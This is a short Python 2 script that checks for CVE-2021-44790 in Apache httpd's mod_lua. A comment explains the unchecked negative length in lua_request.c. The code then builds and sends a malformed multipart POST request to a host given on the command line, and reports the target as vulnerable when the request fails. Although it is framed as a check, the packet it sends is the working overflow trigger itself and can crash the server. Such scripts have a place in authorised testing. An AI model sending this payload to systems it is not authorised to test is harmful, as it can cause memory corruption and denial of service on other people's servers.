## https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2021-44790
## Check to CVE-2021-44790 vulnerability
########################################
# In file lua_request.c in function lua_request.c
# line 415.
# Variable "vlen" does not have check for
# negative number.
# Because of this you can set vlen = -1
# and copy 18446744073709551615 bytes
# to buffer.
########################################

import requests_raw
import sys

def send_packet(req,host):
	try:
		cont = requests_raw.raw(url='http://{}/'.format(host), data=req).content
	except Exception:
		return 0
	return 1

def gen_packet(url,host):
	packet='''POST {} HTTP/1.1\r\n'''.format(url)
	packet+="Host: {}\r\n".format(host)
	packet+="Content-Length: 9\r\n"
	packet+="Content-Type: multipart/form-data; boundary=A\r\n\r\n"
	packet+="A\r\n\r\n\n\n\nA"
	return packet

def help():
	print "Run: python2 {0} <URL> <HOST>\nExample: python2 {0} mysite/index.lua 127.0.0.1:80".format(sys.argv[0])
	exit()

if __name__=="__main__":
	if len(sys.argv)!=3:
		help()
	url="/"+sys.argv[1]
	host=sys.argv[2]
	packet=gen_packet(url,host)
	if send_packet(packet,host) == 0:
		print "[+] Vulnerable"
	else:
		print "[-] Patched"
